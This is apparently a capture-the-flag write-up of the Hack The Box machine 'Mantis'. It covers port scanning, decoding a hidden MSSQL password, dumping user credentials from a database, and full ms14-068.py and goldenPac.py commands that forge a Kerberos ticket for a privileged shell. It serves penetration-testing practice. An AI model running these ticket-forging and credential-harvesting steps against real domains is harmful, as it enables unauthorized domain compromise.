```json
Alias: Mantis
Date: 08-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Hard
Status: Complete
IP: 10.129.248.24
```

---

# Information Gathering
## NMAP
```
Nmap scan report for 10.129.248.24
Host is up (0.27s latency).
Not shown: 980 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-08 15:34:48Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2024-08-08T15:36:01+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-08T15:29:22
|_Not valid after:  2054-08-08T15:29:22
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Tossed Salad - Blog
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49167/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2024-08-08T11:35:50-04:00
|_clock-skew: mean: 1h00m01s, deviation: 2h00m02s, median: 0s
| smb2-time:
|   date: 2024-08-08T15:35:47
|_  start_date: 2024-08-08T15:29:16
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 283.39 seconds
```
## Discovered Subdomains
```
best.test.com
```

---
# Enumeration
## Port 445 - SMB (SMBV2)
No anonymous bind

- [x] Enumerated
- [ ] Vulnerable


## LDAP
No anonymous bind
- [x] Enumerated
- [ ] Vulnerable

## Port 1337

Running a IIS webserver, secure_notes directory can be found by fuzzing, it contains:

```
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
```

But the name of the file is weird. It contains a b64 encoded string, decoding it we get this
`6d2424716c5f53405f504073735730726421`
We can get the characters corresponding to the hex characters using xxd
`m$$ql_S@_P@ssW0rd!`

And we get the password for mssql.

## MSSQL
Using mssql client to connect to the server
`mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@'$IP`

```sql
use orcharddb;
select * from blog_Orchard_Users_UserPartRecord;
```

and we get credentials for james

| Username | Password        |
| -------- | --------------- |
| james    | J@m3s_P@ssW0rd! |

---

# Exploitation

The machine is vulnerable to ms14-068 a vulnerability where the KDC accepts checksum other than the one defined for MS-PAC, even md5sum. To exploit this we use pykek. pykek works by requesting a TGT without a PAC, separately forging a PAC and for the TGS request sending it along with the TGT from the first step. more [details](https://labs.withsecure.com/publications/digging-into-ms14-068-exploitation-and-defence) 

Generate a kerberos ticket by
```
python ms14-068.py -u james@htb.local -d mantis.htb.local -p
J@m3s_P@ssW0rd! -s S-1-5-21-4220043660-4019079961-2895681657
```

For use with Impacket, move and rename the generated ticket to /tmp/krb5cc_0.

use Goldenpac.py to get priv shell

`goldenPac.py HTB.Local/James:'J@m3s_P@ssW0rd!'@Mantis`

---

# Flags
- a095d994ec1f477d030bf65f59cb892b
- e8a98ca939bf99067aed61294fa7f953

#CTF #CTF/Hackthebox #CTF/Hackthebox/Hard  #ActiveDirectory #Kerberos #ms14-068